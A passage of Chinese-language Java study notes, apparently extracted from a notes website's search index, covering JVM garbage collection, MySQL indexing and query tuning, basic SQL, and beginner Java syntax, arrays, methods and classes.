之后我们通过反射获取类的字节码, 并且获取类上的@Topic注解, 读取到里面定义的主题 , 通过策略模式将不同主题的消息分发到不同的处理器中 除了上述之外, 在我们项目开发中经常使用的一些框架, 例如 : Mybatis , Spring , SpringMVC 等, 以及一些常用的工具库 common-utils , hutool工具库等都大量使用到了反射机制 java常见的集合类有哪些 常用的线程安全的类有哪些 ? Vector：就比Arraylist多了个 synchronized （线程安全），因为效率较低，现在已经不太建议使 用。 hashTable：就比hashMap多了个synchronized (线程安全)，不建议使用。 ConcurrentHashMap：是Java5中支持高并发、高吞吐量的线程安全HashMap实现 JDK1.8堆内存结构 分为Young 年轻区和Tenured 年老区，Jdk1.7和Jdk1.8的区别在于, 1.8将永久代中的对象放到了元数据区, 不存永久代这一区域了 Young 年轻区又分为Eden区、Survivor0区和Survivor1区，其中Eden区是对象被创建的初始区域，Survivor0区和Survivor1区是两个大小相同的区域，用于存放从Eden区复制过来的存活对象。当一个Survivor区被填满时，其中的存活对象会被复制到另一个Survivor区中，同时对Survivor区中的对象进行清除操作。当一个对象经过多次垃圾回收后仍然存活，则会被晋升到年老区中。 Tenured 年老区用于存放长时间存活的对象。当老年代空间不足时，会触发一次Full GC操作，对老年代中的垃圾进行清理。 Gc垃圾回收 JVM的垃圾回收动作可以大致分为两大步，首先是「如何发现垃圾」，然后是「如何回收垃圾」 线程私有的不存在垃圾回收, 只有线程共享的才会存在垃圾回收, 所以堆中存在垃圾回收。 如何发现垃圾 但是常见的用于「发现垃圾」的算法有两种，基于引用计数和基于根搜索算法 引用计数算法 核心思想是，堆中的对象每被引用一次，则计数器加1，每减少一个引用就减1，当对象的引用计数器为0时可以被当作垃圾收集。 优点：快 缺点：无法检测出循环引用。如两个对象互相引用时，他们的引用计数永远不可能为0 根搜索算法（可达性分析） 根搜索算法是把所有的引用关系看作一张图，从一个节点GC ROOT开始，寻找对应的引用节点，找到这个节点以后，继续寻找这个节点的引用节点，当所有的引用节点寻找完毕之后，剩余的节点则被认为是没有被引用到的节点，即可以当作垃圾。 如何回收垃圾 标记-清除算法 分为“标记”和“清除”两个阶段：首先标记出所有需要回收的对象，在标记完成之后统一回收掉所有被标记的对象。 缺点：首先，效率问题，标记和清除效率都不高。其次，标记清除之后会产生大量的不连续的内存碎片。 标记-整理算法 是在标记-清除算法基础上做了改进，标记阶段是相同的，但标记完成之后不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，在移动过程中清理掉可回收的对象，这个过程叫做整理。 优点：内存被整理后不会产生大量不连续内存碎片。 复制算法 将可用内存按容量分成大小相等的两块，每次只使用其中一块，当这块内存使用完了，就将还存活的对象复制到另一块内存上去，然后把使用过的内存空间一次清理掉。 缺点：可使用的内存只有原来一半。 分代收集算法 当前主流JVM都采用分代收集(Generational Collection)算法, 这种算法会根据对象存活周期的不同将内存划分为年轻代、年老代、永久代，不同生命周期的对象可以采取不同的回收算法，以便提高回收效率。 新生代和老年代分别采用什么垃圾回收算法 新生代采用的垃圾回收算法是：复制算法。因为存活的对象比较少，所以需要复制的对象自然就少，所以效率高。 老年代中的对象存活时间比较久，每次垃圾回收之后，存活对象比较多，而需要回收的垃圾对象比较少，所以适合采用标记-清除、标记-整理算法。 数据库plus 数据库三范式 数据库三范式目的是减少数据冗余，提高数据的一致性和可靠性。 三范式分为以下三个范式： 第一范式（1NF）：原子性。即属性不能再分解为更小的部分，要求每个属性都是原子的。 第二范式（2NF）：唯一性。即每个表必须有一个主键，每个非主键的属性必须依赖于主键。 第三范式（3NF）：不存在传递依赖。要求一个数据库表中不包含已在其它表中已包含的非主关键字信息。 反三范式 反三范式（Denormalization）是一种针对关系型数据库的优化技术，其目的是通过增加冗余数据，提高数据库的查询性能和可扩展性。与三范式相反，反三范式强调将数据冗余到较低范式的表中，避免在查询时进行复杂的多表联合查询，提高查询效率。 但是，反三范式也可能会增加数据的更新成本和风险，因为每次对冗余数据的更新都需要更新到所有相关的表中，否则就会导致数据不一致。因此，在使用反三范式的时候，需要权衡查询效率和数据更新成本和风险。 存储引擎 MyISAM：不支持事务、不支持外键、不支持行锁，访问快；适合查询以及插入为主的应用（5.5 之前版本默认存储引擎） InnoDB：支持事务和外键操作，支持并发控制，占用磁盘空间大；适合频繁修改以及涉及到安全性较高的应用（5.5 之后版本默认存储引擎） 事务隔离级别 隔离级别 脏读 不可重复读 幻读 Read uncommitted【读未提交】 √ √ √ Read committed【读已提交】 × √ √ Repeatable Read(默认)【可重复读】 × × √ Serializable【串行化】 × × × 脏读：一个事务可以查看到另一个事务还未提交的数据 不可重复读：在一个事务的两次查询之间，存在另一个事务对该数据进行修改并提交，导致两次查询的数据不一致的情况 幻读：在一个事务的两次查询之间，存在另一个事务进行添加数据，然而在本次事务中却看不到的情况。 索引的分类 普通索引 唯一索引：与普通索引类似，不同的是索引列的值必须唯一，允许有空值 主键索引：用于唯一标识数据表格中的记录，不允许有空值，一般用primart key约束 联合（复合）索引：多个字段上建立的索引，能够加速复合查询条件的索引 全文索引 索引结构 MySQL数据库支持多种索引结构，常见的有两种数据结构: hash 和 B+Tree，我们比较常用的MyISAM和InnoDB存储引擎都是基于B+Tree的。 hash索引：把数据的索引以hash形式组织起来，因此当查找某一条记录的时候，速度非常快。但是因为是hash结构，每个键只对应一个值，而且是散列的方式分布，所以他并不支持范围查找和排序等功能。 在B+Tree中，所有数据记录节点都是按照键值大小顺序存放在同一层叶子节点上，而非叶子节点只存储key值信息，可以大大增大每个节点存储的key值的数量，降低B+Tree的高度。 如何避免索引失效 对于联合索引没有使用最左原则进行查询 索引字段的值不能有null值，有null值会使该列索引失效 like模糊查询以%开头 在索引的列上使用表达式或者函数会使索引失效 如果列类型是字符串，那一定要在条件中将数据使用单引号引用起来,否则不使用索引 如果条件中有or，即使其中有条件带索引也会失效 如何优化索引 优化索引的方法有以下几个： 确保表结构合理：索引只能优化查询，而不能优化表结构不合理的问题。因此，要想优化索引，必须首先确保表结构合理，如避免使用过多的关联查询，避免使用过多的数据类型，避免使用过多的字段等。 选择合适的索引类型：MySQL 支持多种类型的索引，如 B-tree、哈希索引、全文索引等。不同类型的索引适用于不同的场景，要选择最合适的索引类型。 索引覆盖：索引覆盖是指查询语句中要查询的字段全部都在索引中，这时候 MySQL 不需要访问表的数据文件，直接从索引中取得所需数据，大大减少了查询的时间。 减少查询中的 LIKE 和通配符：在查询语句中使用 LIKE 和通配符会导致 MySQL 无法使用索引，因此，要尽量避免在查询语句中使用 LIKE 和通配符。 避免使用不等于号：在查询语句中使用 != 或 <> 也会导致 MySQL 无法使用索引，应该尽量避免使用这种方式。 避免使用函数：在查询语句中使用函数会导致 MySQL 无法使用索引，因此，要尽量避免在查询语句中使用函数。 合理使用联合索引：如果在查询语句中同时使用了多个字段进行查询，可以考虑使用联合索引，这可以提高查询的效率。 定期分析表和优化索引：对于经常变更数据的表，需要定期进行分析和优化，以确保索引的有效性。 对查询频次较高, 且数据量比较大的表, 建立索引. 索引字段的选择, 最佳候选列应当从where子句的条件中提取, 如果where子句中的组合比较多, 那么应 当挑选最常用, 过滤效果最好的列的组合. 使用唯一索引, 区分度越高, 使用索引的效率越高. 索引并非越多越好, 如果该表赠,删,改操作较多, 慎重选择建立索引, 过多索引会降低表维护效率. 使用短索引, 提高索引访问时的I/O效率, 因此也相应提升了Mysql查询效率. 如果where后有多个条件经常被用到, 建议建立符合 索引, 复合索引需要遵循最左前缀法则, N个列组合 而成的复合索引, 相当于创建了N个索引. 复合索引命名规则 index表名 列名1列名2 列明3 比如:create index idx_seller_name_sta_addr on tb_seller(name, status, address) 2 避免索引失效 如果在查询的时候, 使用了复合索引, 要遵循最左前缀法则, 也就是查询从索引的最左列开始, 并且不能 跳过索引中的列. 尽量不要在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描 应尽量避免在 where 子句中使用 != 或 <> 操作符，否则将引擎放弃使用索引而进行全表扫描。 不做列运算where age + 1 = 10，任何对列的操作都将导致表扫描，它包括数据库教程函数.计算表达式 等, 都会是索引失效. 查询 like，如果是 ‘%aaa’ 也会造成索引失效. 应尽量避免在 where 子句中使用 or 来连接条件，如果一个字段有索引，一个字段没有索引，将导致 引擎放弃使用索引而进行全表扫描 SQL语句调优 根据业务场景建立复合索引只查询业务需要的字段，如果这些字段被索引覆盖，将极大的提高查询效率. 多表连接的字段上需要建立索引，这样可以极大提高表连接的效率. where条件字段上需要建立索引, 但Where条件上不要使用运算函数，以免索引失效. 排序字段上, 因为排序效率低, 添加索引能提高查询效率. 优化insert语句: 批量列插入数据要比单个列插入数据效率高. 优化order by语句: 在使用order by语句时, 不要使用select *, select 后面要查有索引的列, 如果一条 sql语句中对多个列进行排序, 在业务允许情况下, 尽量同时用升序或同时用降序. 优化group by语句: 在我们对某一个字段进行分组的时候, Mysql默认就进行了排序, 但是排序并不是我们 业务所需的, 额外的排序会降低效率. 所以在用的时候可以禁止排序, 使用order by null禁用. select age, count(*) from emp group by age order by null 尽量避免子查询, 可以将子查询优化为join多表连接查询. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-03-22 12:09 "},"Java笔记/02-未归类知识点.html":{"url":"Java笔记/02-未归类知识点.html","title":"02-未归类知识点","keywords":"","body":"SQL易忘点 -- 将goods改名成goods2** ALTER TABLE goods RENAME TO goods2; -- 将goods2表中的img字段的改成varchar(100)** ALTER TABLE goods2 MODIFY img VARCHAR(100); -- 不带条件修改数据，将所有的price改成0** UPDATE goods SET price=0; -- 带条件删除数据，删除name为'小米11'的数据** DELETE FROM goods WHERE NAME='小米11'; -- 去除重复查询: DISTINCT* SELECT DISTINCT NAME FROM goods; -- 单列排序 -- 查询所有数据,使用price升序排序* SELECT FROM goods ORDER BY price ASC; -- 查询每种类型的商品数量* SELECT category, COUNT() FROM goods2 GROUP BY category; -- 查询销量大于100的商品,按商品类型分组,统计每组的数量* SELECT category, COUNT() FROM goods2 WHERE sales_volume>100 GROUP BY category; Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-22 16:48 "},"Java笔记/基础班day01.html":{"url":"Java笔记/基础班day01.html","title":"基础班day01","keywords":"","body":"Java语言介绍 Java之父：James Gosling 学习路径： HelloWorld public class HelloWorld{ //public限制类名必须与文件名相同 public static void main(String[] args){ //程序入口，快捷短语main（idea版本大于2019） System.out.println(\"hellp java~\"); //快捷短语sout（idea版本大于2019） } } javac 文件名.后缀编译Java文件 java 类名运行Java文件 IDEA 模块划分：project → 多个module → 多个package → 多个java类 工程创建 模块创建 快捷键：复制当行代码“Ctrl+D”，删除当行代码“Ctrl+X”，移动当行代码“Ctrl+shift+上下键”，格式化代码“Ctrl+Alt+L” 基础语法 注释： 单行注释：//注释 多行注释：/*注释*/ 文档注释：/**注释*/ 关键字： 常见关键字 public：限制类名和文件需要保持一致 class：用于声明一个类，创建Java程序的骨架 static： 关键字的特点： 关键字的字母全部小写 常用的代码编辑器对关键字都有高亮显示 main：不属于关键字，它是程序的入口方法，Java虚拟机只能识别这个名字 常量 概述 在程序中直接写出来的值 或是在程序中不可以发生改变的值 分类： 常量类型 说明 举例 字符串常量 用双引号括起来的内容 “HelloWorld” 整数常量 100、-10 小数常量 3.14、6.18、3.0 字符常量 用单引号括起来的内容，不能为空，只能是单个内容 ‘A’ 布尔常量 ture、false 常量 格式1：数据类型 变量名 = 初始化值; 格式2：数据类型 变量名; 、 变量名 = 初始化值; 格式3：数据类型 变量名 = 值 ， 变量名 = 值; 数据类型 Java是强类型语言，Java中的数据必须明确数据类型 数据类型包括：基本数据类型和引用数据类型 基本数据类型： 整型 byte 1字节 -128 ~ 127 short 2字节 -32768 ~ 32767 int【默认类型】 4字节 -2147483648 ~ 2147483647（21亿） long（数字后+L） 8字节 -92233......75808 ~ 92233......75807（19位）超过12亿要加L 浮点型 float（数字后+F） 4字节 -1.4E-45 ~ 3.4E38 double【默认类型】（数字后+D） 8字节 -4.9E-324 ~ 1.79E308 字符型 char 2字节 0 ~ 65535 布尔型 boolean 1字节 ture、false 引用数据类型： 数组 类：string 接口 标识符 用户编程时使用的名字，用于给类、方法、变量、常量等命名 组成规则： 由字母、数字、下划线_、美元符号$组成，第一个字符不能是数字 不能使用关键字作为标识符 标识符区分大小写 Java中标识符的命名规范： 类名使用大驼峰式，例如：HelloWorld 变量名、方法名使用小驼峰式，例如：stuAge 自定义常量使用全大写，例如：MAX_VALUE Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-24 16:59 "},"Java笔记/基础班day02.html":{"url":"Java笔记/基础班day02.html","title":"基础班day02","keywords":"","body":"计算机原理 JDK：Java development kit，Java开发工具，包含了JRE和开发工具 JRE：Java runtime environment，Java运行环境，包含JVM和Java的核心类库（Java API） JVM：Java virtual machine，Java虚拟机 数据类型转换 自动类型转换：把一个数据范围小的数值或变量赋值给另一个表示数据范围更大的变量 强制类型转换：把一个表示数据范围大的数值或者变量赋值给另一个表示数据范围小的变量（可能导致数据丢失） 格式：数据类型 变量名= (数据类型)变量/值; 例如：float f = (float)2.0; char字符注意点： char c = 97; //a int c = 'a'; //97 键盘录入数据 步骤： 导入包：import java.util.Scanner; //Scanner:JDK提供的一个可接受键盘输入数据的类 创建对象：Scanner sc = new Scanner(System.in); //sc：变量名 键盘输入数据：int i = sc.nextInt(); //i：变量名 ​ String s = sc.next(); //s：变量名 没有字符类型录入 算术运算符 算术运算符：+加、-减、*乘、/除、%取余 注意事项： 整数计算的结果还是整数，如果要出现小数需要有小数参与运算 byte、short、char类型在算术运算时会自动提升为int类型【char类型体现为对应ascii表的数值】 混合运算中，是先乘除后加减，可用()改变运算顺序 字符串的拼接 任何类型的数据和字符串使用+操作都表示为拼接（注意：运算顺序，前运算后拼接） 赋值运算符 赋值运算符：=等于、+=加等、-=减等、*=乘等、/=除等、%=取余等 运行流程：先把符号左边的变量和右边的数据进行运算，再整体强制转换为左边的类型，再把结果赋值给左边的变量 注意事项：拓展赋值运算符底层隐含了强制类型转换，c += x; ==> c = (变量c的数据类型)( c + x ); 自增自减运算符 ++加加运算符、--减减运算符 在参与运算中，++前置：先加一，后使用；后置++：先使用，后加一 关系运算符（比较运算符） 关系运算符：==等于、!=不等于、>大于、=大于等于、 逻辑运算符 逻辑运算符：&&与、||或、!非 短路效应：如果 && 的左边为false，则右边就不执行了；如果 || 的左边为ture，则右边就不执行了，但如果使用的是&和|，则无论左边结果如何，右边仍会执行 三元运算符 格式：关系表达式 ? 表达式1 : 表达式2; 运算方式： 首先计算关系表达式的值， 如果值为ture，则返回表达式1的值； 如果值为false，则返回表达式2的值； 注意：三元运算必须要有应用（1、直接输出，2、使用变量接收【推荐】） Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-25 19:26 "},"Java笔记/基础班day03.html":{"url":"Java笔记/基础班day03.html","title":"基础班day03","keywords":"","body":"if语句 格式1 if(布尔表达式){ 语句体; //若语句体内只有一句代码，则可以省略if的大括号{} } 格式2 if(布尔表达式){ 语句体1; }else{ 语句体2; } 格式3 if(布尔表达式1){ 语句体1; }else if(布尔表达式2){ 语句体2; }else if(布尔表达式3){ 语句体3; }else{ 语句体4; } switch语句 格式 switch(变量){ //变量类型可以为：byte、short、char、int、string、枚举 case 值1： 语句体1; break; //case穿透：若此处没有break，则直接执行下去，不作判断，直到break case 值2： 语句体2; break; ... default: 语句体n+1; [break;] //最后的break可不写 } for循环 适用于明确次数的场合 格式 快捷键：数字.fori：从小到大循环若干次，数字.forr：从大到小循环若干次 for(初始化语句①;条件判断语句②;条件控制语句④){ 循环体语句③; } while循环 适用于不明确次数的场合 格式 初始化语句; //控制循环的变量进行初始化 while(条件判断语句){ //控制循环体对是否要执行的判断条件 循环体语句; 条件控制语句; //对控制循环的变量进行改变，也就是控制循环的进度 } do-while循环 一般没有适用场合 格式 初始化语句; do{ 循环体语句; 条件控制语句; }while(条件判断语句); 跳转控制语句 break：终止循环体内容的执行，即结束当前的整个循环 continue：跳过当次循环体内容的执行，继续下一次循环 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-18 09:40 "},"Java笔记/基础班day04.html":{"url":"Java笔记/基础班day04.html","title":"基础班day04","keywords":"","body":"Random随机数 步骤： 导入包：import java.util.Random; 创建对象：Random r = new Random(); 生成随机数：int i = r.nextInt(10); 任意范围随机数 r.nextInt(10); 小括号里面的数字： 代表生成随机数的范围[0,数字 - 1] 代表这个范围中数字的个数 只能是正整数 想要获取任意范围的随机数[x,y]：r.nextInt( y - x + 1 ) + x; 数组 定义：数组是一种容器，用来存储同种数据类型的多个值 格式1： 数据类型[] 变量名；，例如：int[] array; 格式2： 数据类型 变量名[];，例如：int array[]; 初始化： Java中的数组必须先初始化然后才能使用 初始化即在内存中，为数组容器开辟空间，并将数据存入容器的过程。 范例：int[] arr = new int[]; 左边： int：代表数组存储的数据类型 []：代表定义的是一个数组 arr：数组的名字（数组的地址） 右边： new：申请内存空间 int：数组存储的数据类型 [3]：申请3块空间 动态初始化： 初始化时只指定数组长度，由系统为数组分配初始值 格式：数据类型[] 变量名 = new 数据类型[数组长度]； 静态初始化： 初始化时同时指定数组要存储的元素，系统自动计算出该数组长度 格式：数据类型[] 变量名 = new 数据类型[]{数据1，数据2，数据3，.....}； 简化格式：数据类型[] 变量名 = {数据1，数据2，数据3，.....}； 内存分配 栈内存：方法运行时，进入到内存，局部变量都存放于这块内存当中 堆内存：new出来的内容都会进入堆内存，并且会存在地址值，并对数据进行默认赋值 整数：0 小数：0.0 布尔类型：false 引用数据类型：null 方法区：字节码文件（class文件）加载时进入到内存 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-17 16:55 "},"Java笔记/基础班day05.html":{"url":"Java笔记/基础班day05.html","title":"基础班day05","keywords":"","body":"方法 定义：方法（method）就是一段具有独立功能的代码块，可提高代码的复用性 定义格式： public static void 方法名(){ 程序体; } 调用格式： 方法名(); 带参数方法定义： public static void 方法名 (数据类型 变量名){ 程序体; } 带参数调用格式： 方法名(常量/变量); 作用域：变量定义的所对应的大括号{}，即为变量的作用域 带返回值的方法定义： public static 数据类型 方法名（参数）{ 程序体; return 数据; } 带返回值方法调用： 格式1：方法名（参数）; 范例：isEvenNumber（5）; 格式2：数据类型 变量名 = 方法名（参数）; 范例：boolean flag = isNevenNmuber（5）; 注意事项： 定义方法时不能嵌套定义，即不能将方法定义在另一个方法内 return的作用，除了具备返回一个值之外，还可以结束掉方法 如果返回值为void，也可以用return，但是后面不能接任何值，只能是return; 定义一个方法时，一定要保持语法的完整性 如果方法里有判断，则需注意当判断都为false时，最终是否有返回值 方法重载：同一个类中，有多个同名的方法，参数列表不同（参数个数不同 或 参数的类型不同），这些方法之间的关系即为方法重载（方法重载和返回值的类型没有任何关系，只关注参数列表） 不同的类型数据作为参数传递时： 基本数据类型作为参数传递，形参的改变，不会影响实参的值 引用数据类型作为参数传递，形参的改变，会改变实参的值 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-19 17:21 "},"Java笔记/基础班day06.html":{"url":"Java笔记/基础班day06.html","title":"基础班day06","keywords":"","body":"Debug Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-15 15:47 "},"Java笔记/基础班day07.html":{"url":"Java笔记/基础班day07.html","title":"基础班day07","keywords":"","body":"面向对象基础 类和对象 类：对现实生活中一类具有共同属性和行为的事物的抽象 对象：能够看得到摸得着的真实存在的实体 两者的关系：类是对象的描述，对象是类的实体，在Java里面，类是对象的数据类型 类 类的组成：属性和行为 属性：在类中通过成员变量来体现（类中方法外的变量） 行为：在类中通过成员方法来体现（与之前的方法相比去掉static关键字即可） public class 类名{ //成员变量 变量1的数据类型 变量1； 变量2的数据类型 变量2； .... //成员方法 方法1； 方法2； .... } public class Student { //属性：姓名、年龄 String name; int age; //行为：学习 public void study(){ System.out.println(\"好好学习，争取月薪15K+\"); } } 对象 创建对象： 格式：类名 对象名 = new 类名(); 范例：Student s = new Student(); 使用对象： 成员变量的使用 格式：对象名 变量名 范例：s.name 成员方法的使用： 格式：对象名.方法名() 范例：s.study(); public class StudentTest(){ public static void main(String[] args){ //对象的创建 Student s = new Student(); //new的数据存储在堆内存中，堆内存的数据有默认值，如果我们直接输出成员变量是不会报错的 System.out.println(s.name);//null System.out.println(s.age);//0 //给成员变量赋值 s.name = \"张三\"; s.age = 23; System.out.println(s.name);//张三 System.out.println(s.age);//23 //成员方法的使用 s.study(); } } 局部变量和成员变量 区别 局部变量 成员变量 类中位置不同 方法内或者方法声明上（形参） 类中方法外 内存位置不同 栈内存 堆内存 生命周期不同 随着方法的调用而存在，随着方法的调用完毕而消失 随着对象的存在而存在，随着对象的消失而消失 初始化值不同 没有默认的初始化值，必须先定义后使用 有默认的初始化值 private关键字 private是一个权限修饰符 可以修饰成员（成员变量和成员方法） 被private修饰的成员只能在本类中才能访问 针对private修饰的成员变量，如果需要被其他类使用，需要提供相应的操作 提供“set变量名(参数)”方法，用于设置成员变量的值，方法用public修饰 提供“get变量名()”方法，用于获取成员变量的值，方法用public修饰 为了保证成员变量的有效性，通常使用private修饰变量，并提供一个set变量名(参数)的方法给别的类赋值 //封装类 public class Student { //成员变量 String name; private int age; //成员方法 public void setAge(int a){ if(a > 0 && a //测试类 public class StudentTest { public static void main(String[] args){ //创建对象 Student s = new Student(); //对成员变量进行赋值 s.name = \"张三\"; s.setAge(23); //获取成员变量并单独赋值 int age = s.getAge(); s.show(); } } this关键字 如果方法中和类中有相同名字的变量，用this.变量名代表成员变量 方法被哪个对象调用，this就代表哪个对象，如：Student()方法被s调用，则this代表s //封装类 public class Test{ //成员变量 int age = 18; public void test(){ //局部变量 int age = 20; System.out.println(age); //20 System.out.println(this.age); //18 } } //封装类 public class Student { //私有成员变量 private String name; private int age; //提供设置值的方法 public void setName(String name){ this.name = name; //赋值给成员变量，this.name其实相当于s.name } public void setAge(int age){ age = age; //赋值给局部变量 } //提供获取值的方法 public String getName(){ return name; } public int getAge(){ return age; } } //测试类 public class StudentTest{ public static void main(String[] args){ //创建对象 Student s = new Student(); //给成员变量赋值 s.setName(\"张三\"); s.setAge(23); System.out.println(s.getName()); //张三 System.out.println(s.getAge()); //0 } } 构造方法 概述： 创建对象时，new后面接着的类名（）实际上是一个方法，这个方法称之为：构造方法、构造函数、构造器；每创建一次对象都会调用一次构造方法 系统会默认提供无参构造，无需手动添加；但是如果写了有参构造，则系统不会提供无参构造，需要手动添加 利用有参构造可以在创建对象时就给成员变量进行赋值，减少set方法的使用 格式： 方法名和类名一致 方法没有void也没有返回值类型 也没有return //封装类 public class Student{ String name; int age; //无参构造 public Student(){ } //有参构造 public Student(String name,int age){ this.name = name; this.age = age; } public Student(String name){ this.name = name; } public Student(int age){ this.age = age; } } //测试类 public class StudentTest{ public static void main(String[] ages){ Student s = new Student(\"张三\"); Student s1 = new Student(23); Student s2 = new Student(\"张三\",23); } } 标准封装类 //封装类 public class Student{ //1.私有成员变量 private String name; private int age; //2.提供get/set方法 public void setName(String name){ this.name = name; } public void setAge(int age){ this.age = age; } public String getName(){ return name; } public int getAge(){ return age; } //3.构造方法 public Student(){ } public Student(String name , int age){ this.name = name; this.age = age; } } //测试类 public class StudentTest{ public static void main(String args){ //创建对象 Student s = new Student(); //若没有进行构造方法，则需要一个个set进去 s.setName(\"张三\")； s.setAge(23); //一个个获取值 System.out.println(s.getName() + \"---\" + s.getAge()); //使用有参构造，可以一步到位进行赋值 Stdent s2 = new Student(\"李四\" , 23)； System.out.println(s2.getName() + \"---\" + s2.getAge()); } } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-22 17:47 "},"Java笔记/基础班day08.html":{"url":"Java笔记/基础班day08.html","title":"基础班day08","keywords":"","body":"API String 位于java.base --> java.lang下（java.lang包内的不需要导包） //对象都是一个内存地址，只是在输出字符串时，选择输出的是内容 public static void main(String[] args){ //使用构造方法得到字符串对象 String s1 = new String(\"abcd\"); String s2 = new String(\"abcd\"); //直接赋值的方式得到字符串 String s3 = \"abcd\"; String s4 = \"abcd\"; System.out.println(\"s1:\" + s1); //s1:abcd System.out.println(\"s2:\" + s2); //s2:abcd System.out.println(\"s3:\" + s3); //s3:abcd System.out.println(\"s4:\" + s4); //s4:abcd //实际上就是比较两个对象的内存地址值 //通过构造方法创建的字符串对象，内容即便是相等的，地址值也是不一样的（每new一次就会得到一个新的地址） //通过直接赋值的方式得到的字符串对象，如果内容相同，那么地址值就是一样的（字符串是可以共享的） System.out.println(s1 == s2); //false System.out.println(s1 == s3); //false System.out.println(s3 == s4); //ture } 字符串常量池 equals方法 equals：boolean[返回值类型] equals(Object anObject) 将此字符串与指定对象进行比较 虽然Object可以代表所有的类型，但只有跟字符串类型比较时，才比较内容，否则一律返回false 范例： String s = \"abcd\"; String s1 = new String(\"abcd\"); System.out.println(s == s1); //false //运用equals对比字符串s和s1 System.out.println(s.equals(s1)); //true 字符串遍历 String s = \"abcde\"; String s2 = \"\"; for (int i = s.length() - 1; i >= 0; i--) { //获取每一个字符 char ch = s.charAt(i); s2 += ch; } System.out.println(\"字符串倒序\" + s2); StringBuilder public static void main(String[] args) { //创建StringBuilder对象 StringBuilder s = new StringBuilder(); s.append(\"一叶知秋\"); s.append('S'); s.append(01); s.append(true); System.out.println(\"s：\" + s); //s：一叶知秋S1true //反转 s.reverse(); System.out.println(\"s：\" + s); //s：eurt1S秋知叶一 //获取长度 System.out.println(\"长度：\" + s.length()); //长度：10 //转化为String String str = s.toString(); System.out.println(\"str：\" + str); //str：eurt1S秋知叶一 } String和StringBuilder的转换 public static void main(String[] args) { //String和StringBuilder的转换 String s = \"a\"; //字符串转换为StringBuilder StringBuilder sb = new StringBuilder(\"a\"); sb.append(\"b\"); sb.append(\"c\"); //StringBuilder转换为字符串 String str = sb.toString(); } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-29 22:26 "},"Java笔记/基础班day09.html":{"url":"Java笔记/基础班day09.html","title":"基础班day09","keywords":"","body":"集合 集合和数组的区别 共同点：都是存储数据的容器 不同点：数组的容量是固定的，集合的容量是可变的 public static void main(String[] args) { //创建一个集合 ArrayList list = new ArrayList(); //添加数据 list.add(123); list.add(\"abc\"); System.out.println(list); //[123, abc] //插入数据 list.add(0,\"插入\"); System.out.println(list); //[插入, 123, abc] } 泛型 类名：代表的是泛型，需要保存什么类型的数据，就把其改为对应的类型 ArrayList list = new ArrayList<>(); //存储字符串类型数据 集合不能存储基本数据类型，只能是引用数据类型（数组、类、接口） | 数据类型 | 对应类名 | | -------- | --------- | | byte | Byte | | short | Short | | char | Character | | int | Integer | | long | Long | | float | Float | | double | Double | | boolean | Boolean | //Integer类 ArrayList list = new ArrayList<>(); //String类 ArrayList list2 = new ArrayList<>(); //需要提前创建Student类 ArrayList list3 = new ArrayList<>(); Student s1 = new Student(\"张三\", 23); Student s2 = new Student(\"李四\", 24); Student s3 = new Student(\"王五\", 25); list.add(s1); list.add(s2); list.add(s3); //list = [Student@682a0b20, Student@3d075dc0, Student@214c265e] System.out.println(\"list3 = \" + list3); ArrayList集合常用方法 类型 方法名 说明 增 public boolean add(E element) 将指定的元素追加到末尾 增 public boolean add(int index, E element) 在指定位置插入指定的元素 删 public boolean remove(Object o) 删除指定的元素，并返回是否成功 删 public E remove(int index) 删除指定索引处的元素，并返回被删除的元素 查 public E get(int index) 返回指定索引处的元素【务必需要接收】 查 public int size() 返回集合中的元素个数 改 public E set(int index,E element) 修改指定索引处的元素，并返回被修改的元素 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-22 11:01 "},"Java笔记/基础班day10.html":{"url":"Java笔记/基础班day10.html","title":"基础班day10","keywords":"","body":"//类方法、静态方法 public static void 方法名(){} //成员方法、实例方法、非静态方法 public void 方法名(){} //构造方法 public 方法名(){} Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-10-25 11:30 "},"Java笔记/Day01-Static+继承+权限修饰.html":{"url":"Java笔记/Day01-Static+继承+权限修饰.html","title":"Day01-Static+继承+权限修饰","keywords":"","body":"static静态关键字 静态成员变量（类变量），可以被类的所有对象共享（访问、修改） 访问格式：类名.静态成员变量（推荐）、对象.静态成员变量（不推荐） 属于类、加载一次，内存中只有一份 出现顺序：类加载 --> 静态变量创建 --> 创建对象 --> 成员变量 静态方法（类方法） 访问格式：类名.静态成员方法（推荐）、对象.静态成员方法（不推荐） 静态方法只能访问本类的静态成员，静态方法中不能使用super、this关键字 静态方法应用-工具类 工具类不需要创建对象，其构造器私有化处理 静态方法应用-静态代码块 代码块是类的5大成分之一（成员变量、构造器，方法，代码块，内部类） 静态代码块static{ ... }执行时间：静态代码块随着类的加载而执行，只执行一次 触发类加载的情况：1、首次创建对象；2、调用类的方法；3、在类中运行main方法 构造代码块{ ... }执行时间：构造代码块随着构造方法的调用而先执行，每次调用构造方法时，构造代码块都会执行 继承 定义：继承是将多个类的相同属性和行为抽取到单独一个类中，那么多个类无需再定义这些属性和行为，只要继承单独这个类即可使用这些属性和行为了。多个类称为子类（派生类），单独的这个类称为父类(基类 或超类) 格式：public class 子类名 extends 父类名 { } 特点： Java类只支持单继承，不支持多继承，但支持多层继承 子类可以继承父类的私有成员，但是子类不能直接访问 子类不可以继承父类的构造方法（构造方法名必须和类名相同） 